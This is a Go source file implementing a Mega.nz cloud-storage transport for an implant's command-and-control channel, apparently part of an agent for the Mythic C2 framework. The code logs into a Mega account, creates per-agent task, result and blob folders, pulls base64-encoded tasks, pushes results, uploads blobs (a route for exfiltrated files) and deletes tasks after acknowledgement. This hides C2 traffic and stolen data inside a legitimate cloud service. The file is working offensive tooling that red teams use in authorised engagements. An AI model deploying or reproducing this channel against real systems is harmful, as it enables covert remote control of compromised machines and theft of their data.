package multichannel

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	mega "github.com/t3rm1n4l/go-mega"
)

// MegaTransport stores tasks/results as JSON files and blobs as native Mega uploads.
type MegaTransport struct {
	client   megaClient
	agentID  string
	basePath string
	mu       sync.Mutex
}

type megaClient interface {
	Login(email string, passwd string) error
	FSRoot() *mega.Node
	PathLookup(root *mega.Node, ns []string) ([]*mega.Node, error)
	CreateDir(name string, parent *mega.Node) (*mega.Node, error)
	GetChildren(n *mega.Node) ([]*mega.Node, error)
	UploadFile(srcpath string, parent *mega.Node, name string, progress *chan int) (*mega.Node, error)
	DownloadFile(src *mega.Node, dstpath string, progress *chan int) error
	Delete(node *mega.Node, destroy bool) error
	GetUser() (mega.UserResp, error)
}

type goMegaClient struct{ m *mega.Mega }

func (g *goMegaClient) Login(email, passwd string) error { return g.m.Login(email, passwd) }
func (g *goMegaClient) FSRoot() *mega.Node               { return g.m.FS.GetRoot() }
func (g *goMegaClient) PathLookup(root *mega.Node, ns []string) ([]*mega.Node, error) {
	return g.m.FS.PathLookup(root, ns)
}
func (g *goMegaClient) CreateDir(name string, parent *mega.Node) (*mega.Node, error) {
	return g.m.CreateDir(name, parent)
}
func (g *goMegaClient) GetChildren(n *mega.Node) ([]*mega.Node, error) { return g.m.FS.GetChildren(n) }
func (g *goMegaClient) UploadFile(srcpath string, parent *mega.Node, name string, progress *chan int) (*mega.Node, error) {
	return g.m.UploadFile(srcpath, parent, name, progress)
}
func (g *goMegaClient) DownloadFile(src *mega.Node, dstpath string, progress *chan int) error {
	return g.m.DownloadFile(src, dstpath, progress)
}
func (g *goMegaClient) Delete(node *mega.Node, destroy bool) error { return g.m.Delete(node, destroy) }
func (g *goMegaClient) GetUser() (mega.UserResp, error)            { return g.m.GetUser() }

func NewMegaTransport(email, password, basePath string) (*MegaTransport, error) {
	if email == "" || password == "" {
		return nil, errors.New("mega email/password required")
	}
	m := mega.New()
	client := &goMegaClient{m: m}
	if err := client.Login(email, password); err != nil {
		return nil, fmt.Errorf("mega login: %w", err)
	}
	if basePath == "" {
		basePath = "mythic"
	}
	return &MegaTransport{client: client, basePath: basePath}, nil
}

func (m *MegaTransport) Name() string { return "mega" }

func (m *MegaTransport) Register(_ context.Context, agentID string, metadata map[string]string) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.agentID = agentID
	_, err := m.ensureFolder([]string{m.basePath, agentID, "tasks"})
	if err != nil {
		return err
	}
	_, err = m.ensureFolder([]string{m.basePath, agentID, "results"})
	if err != nil {
		return err
	}
	_, err = m.ensureFolder([]string{m.basePath, agentID, "blobs"})
	if err != nil {
		return err
	}
	_ = metadata
	return nil
}

func (m *MegaTransport) PullTasks(_ context.Context, agentID, cursor string) ([]Task, string, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	tasksNode, err := m.ensureFolder([]string{m.basePath, agentID, "tasks"})
	if err != nil {
		return nil, cursor, err
	}
	children, err := m.client.GetChildren(tasksNode)
	if err != nil {
		return nil, cursor, fmt.Errorf("mega list tasks: %w", err)
	}
	if len(children) == 0 {
		return nil, cursor, nil
	}
	var out []Task
	for _, child := range children {
		if !strings.HasSuffix(child.GetName(), ".json") {
			continue
		}
		buf, err := m.downloadNode(child)
		if err != nil {
			continue
		}
		var p struct {
			ID       string            `json:"id"`
			Payload  string            `json:"payload"`
			Metadata map[string]string `json:"metadata"`
		}
		if err := json.Unmarshal(buf, &p); err != nil {
			continue
		}
		payload, _ := base64.StdEncoding.DecodeString(p.Payload)
		out = append(out, Task{ID: p.ID, Payload: payload, Metadata: p.Metadata, CreatedAt: child.GetTimeStamp()})
	}
	return out, time.Now().UTC().Format(time.RFC3339Nano), nil
}

func (m *MegaTransport) PushResult(_ context.Context, taskID string, result Result) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	resultsNode, err := m.ensureFolder([]string{m.basePath, m.agentID, "results"})
	if err != nil {
		return err
	}
	body, _ := json.Marshal(map[string]any{"task_id": taskID, "payload": base64.StdEncoding.EncodeToString(result.Payload), "blob_ref": result.BlobRef, "metadata": result.Metadata, "finished_at": result.FinishedAt.UTC().Format(time.RFC3339Nano)})
	_, err = m.uploadBytes(resultsNode, taskID+".json", body)
	return err
}

func (m *MegaTransport) UploadBlob(_ context.Context, bytes []byte, metadata map[string]string) (BlobRef, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	blobsNode, err := m.ensureFolder([]string{m.basePath, m.agentID, "blobs"})
	if err != nil {
		return BlobRef{}, err
	}
	name := fmt.Sprintf("blob-%d.bin", time.Now().UnixNano())
	if n := metadata["filename"]; n != "" {
		name = n
	}
	node, err := m.uploadBytes(blobsNode, name, bytes)
	if err != nil {
		return BlobRef{}, fmt.Errorf("mega upload blob: %w", err)
	}
	return BlobRef{Reference: filepath.Join(m.basePath, m.agentID, "blobs", node.GetName())}, nil
}

func (m *MegaTransport) DownloadBlob(_ context.Context, ref BlobRef) ([]byte, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	node, err := m.lookupByPath(ref.Reference)
	if err != nil {
		return nil, err
	}
	return m.downloadNode(node)
}

func (m *MegaTransport) Ack(_ context.Context, taskID string) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	node, err := m.lookupByPath(filepath.Join(m.basePath, m.agentID, "tasks", taskID+".json"))
	if err != nil {
		return nil
	}
	return m.client.Delete(node, false)
}

func (m *MegaTransport) Healthcheck(_ context.Context) (Status, error) {
	if _, err := m.client.GetUser(); err != nil {
		return Status{State: HealthDown, Message: err.Error()}, err
	}
	return Status{State: HealthOK, Message: "mega API reachable"}, nil
}

func (m *MegaTransport) ensureFolder(segments []string) (*mega.Node, error) {
	root := m.client.FSRoot()
	if root == nil {
		return nil, errors.New("mega root unavailable")
	}
	cur := root
	for _, seg := range segments {
		nodes, err := m.client.PathLookup(cur, []string{seg})
		if err == nil && len(nodes) > 0 {
			cur = nodes[len(nodes)-1]
			continue
		}
		next, err := m.client.CreateDir(seg, cur)
		if err != nil {
			return nil, err
		}
		cur = next
	}
	return cur, nil
}

func (m *MegaTransport) lookupByPath(path string) (*mega.Node, error) {
	parts := strings.Split(strings.Trim(path, "/"), "/")
	nodes, err := m.client.PathLookup(m.client.FSRoot(), parts)
	if err != nil || len(nodes) == 0 {
		return nil, fmt.Errorf("mega path not found: %s", path)
	}
	return nodes[len(nodes)-1], nil
}

func (m *MegaTransport) uploadBytes(parent *mega.Node, name string, content []byte) (*mega.Node, error) {
	tmp, err := os.CreateTemp("", "mythic-mega-upload-*")
	if err != nil {
		return nil, err
	}
	defer os.Remove(tmp.Name())
	if _, err := tmp.Write(content); err != nil {
		tmp.Close()
		return nil, err
	}
	_ = tmp.Close()
	return m.client.UploadFile(tmp.Name(), parent, name, nil)
}

func (m *MegaTransport) downloadNode(node *mega.Node) ([]byte, error) {
	tmp, err := os.CreateTemp("", "mythic-mega-download-*")
	if err != nil {
		return nil, err
	}
	_ = tmp.Close()
	defer os.Remove(tmp.Name())
	if err := m.client.DownloadFile(node, tmp.Name(), nil); err != nil {
		return nil, err
	}
	return os.ReadFile(tmp.Name())
}
